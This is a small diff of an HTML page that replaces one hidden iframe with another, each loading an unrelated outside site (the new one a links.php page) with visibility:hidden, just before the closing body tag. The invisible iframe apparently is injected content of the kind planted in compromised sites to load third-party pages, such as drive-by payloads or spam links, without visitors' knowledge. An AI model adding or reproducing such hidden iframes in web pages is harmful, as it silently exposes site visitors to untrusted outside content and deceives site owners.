@@ -44,6 +44,6 @@
         </tr>
       </table>
     </div>
-    <iframe src="http://albumpioneer.com" style="visibility:hidden;">
+    <iframe src="http://www.netpoz.com/links.php" style="visibility:hidden;">
   </body>
 </html>
